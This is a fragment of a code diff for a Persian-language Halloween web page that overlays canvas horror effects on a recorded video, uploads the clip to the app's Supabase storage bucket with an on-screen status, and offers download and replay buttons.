+            ctx.fillText('🩸 تو گرفتار شدی', W/2, H/2 - 60);
+            ctx.restore();
+          }
+
+          if (t > 3 && t < 7) {
+            const remaining = Math.ceil(7 - t);
+            const countAlpha = 0.5 + Math.sin(t * 10) * 0.5;
+
+            ctx.save();
+            ctx.globalAlpha = countAlpha;
+            ctx.font = 'bold 120px "Courier New"';
+            ctx.textAlign = 'center';
+            ctx.textBaseline = 'middle';
+            ctx.fillStyle = '#ff0000';
+            ctx.shadowColor = '#ff0000';
+            ctx.shadowBlur = 40;
+            ctx.fillText(remaining, W/2, H/2 - 40);
+            ctx.restore();
+          }
+
+          if (t > 7) {
+            const alpha = Math.min((t - 7) / 0.5, 1);
+            ctx.save();
+            ctx.globalAlpha = alpha;
+            ctx.font = 'bold 40px system-ui';
+            ctx.textAlign = 'center';
+            ctx.textBaseline = 'middle';
+            ctx.fillStyle = '#ff4500';
+            ctx.shadowColor = '#ff0000';
+            ctx.shadowBlur = 30;
+            ctx.fillText('🎃 تو زنده موندی! 🎃', W/2, H/2);
+            ctx.restore();
+          }
+
+          for (let i = 0; i < 5; i++) {
+            const y = (t * 150 + i * 130) % H;
+            ctx.fillStyle = `rgba(255, 0, 0, ${0.1 + Math.random() * 0.15})`;
+            ctx.fillRect(0, y, W, 2 + Math.random() * 2);
+          }
+
+          for (let i = 0; i < 40; i++) {
+            const n = noiseParticles[i];
+            ctx.fillStyle = `rgba(255, 255, 255, ${Math.random() * 0.15})`;
+            ctx.fillRect(n.x + Math.random() * 4, n.y + Math.random() * 4, n.size, n.size);
+          }
+
+          if (Math.sin(t * 4) > 0.98 || Math.sin(t * 7) > 0.99) {
+            ctx.fillStyle = `rgba(255, 255, 255, ${0.3 + Math.random() * 0.4})`;
+            ctx.fillRect(0, 0, W, H);
+          }
+
+          if (Math.sin(t * 2.5) > 0.95) {
+            ctx.fillStyle = 'rgba(255, 0, 0, 0.4)';
+            ctx.fillRect(0, 0, W, H);
+          }
+
+          if (Math.random() > 0.92) {
+            for (let i = 0; i < 3; i++) {
+              const sliceY = Math.random() * H;
+              const sliceH = 5 + Math.random() * 30;
+              const offset = (Math.random() - 0.5) * 40;
+
+              const imageData = ctx.getImageData(0, sliceY, W, sliceH);
+              ctx.putImageData(imageData, offset, sliceY);
+            }
+
+            const rgbColors = ['#ff0000', '#00ff00', '#0000ff'];
+            for (let i = 0; i < 3; i++) {
+              ctx.fillStyle = rgbColors[i] + '40';
+              ctx.fillRect(0, Math.random() * H, W, 3);
+            }
+          }
+
+          ctx.restore();
+
+          if (Math.random() > 0.9) {
+            ctx.fillStyle = 'rgba(255, 0, 0, 0.3)';
+            ctx.fillRect(0, 0, W, 2);
+            ctx.fillStyle = 'rgba(0, 255, 255, 0.3)';
+            ctx.fillRect(0, H - 2, W, 2);
+          }
+
+          if (progress < 1) {
+            requestAnimationFrame(animate);
+          } else {
+            resolve();
+          }
+        }
+        animate();
+      });
+
+      recorder.stop();
+      const videoBlob = await recordingDone;
+      videoBlobGlobal = videoBlob;
+
+      processingStatus.textContent = '📤 آپلود به سرور...';
+
+      const videoName = `halloween_video_${Date.now()}.webm`;
+      const { data: videoData, error: videoError } = await supabase.storage
+        .from(BUCKET_NAME)
+        .upload(videoName, videoBlob, {
+          contentType: 'video/webm',
+          cacheControl: '3600',
+          upsert: false,
+        });
+
+      if (videoError) {
+        console.error(videoError);
+        processingStatus.textContent = '❌ خطا: ' + videoError.message;
+        await new Promise(r => setTimeout(r, 2000));
+      } else {
+        uploadedVideoPath = videoData.path;
+      }
+
+      resultVideo.src = URL.createObjectURL(videoBlob);
+    }
+
+    function showProcessingScreen() {
+      welcomeScreen.classList.remove('active');
+      horrorScreen.classList.remove('active');
+      processingScreen.classList.add('active');
+      progressFill.style.width = '0%';
+    }
+
+    function showEndScreen() {
+      processingScreen.classList.remove('active');
+      endScreen.classList.add('active');
+      if (stream) {
+        stream.getTracks().forEach(t => t.stop());
+        stream = null;
+      }
+      playTone(400, 0.2, 'sine', 0.1);
+      setTimeout(() => playTone(600, 0.2, 'sine', 0.1), 200);
+      setTimeout(() => playTone(800, 0.4, 'sine', 0.15), 400);
+    }
+
+    // ⭐ فقط دکمه دانلود
+    downloadBtn.addEventListener('click', () => {
+      if (!videoBlobGlobal) return;
+      const a = document.createElement('a');
+      a.href = URL.createObjectURL(videoBlobGlobal);
+      a.download = `halloween_${Date.now()}.webm`;
+      a.click();
+    });
+
+    // ⭐ فقط دکمه دوباره
+    againBtn.addEventListener('click', () => {
+      uploadedVideoPath = null;
+      videoBlobGlobal = null;
+      resultVideo.src = '';
+      terminalEl.innerHTML = '';
+      countdownEl.textContent = '5';
+      document.getElementById('eyesContainer').innerHTML = '';
+      document.getElementById('handsContainer').innerHTML = '';
+      progressFill.style.width = '0%';
+      endScreen.classList.remove('active');
+      welcomeScreen.classList.add('active');
+    });
+  </script>
+</body>
+</html>
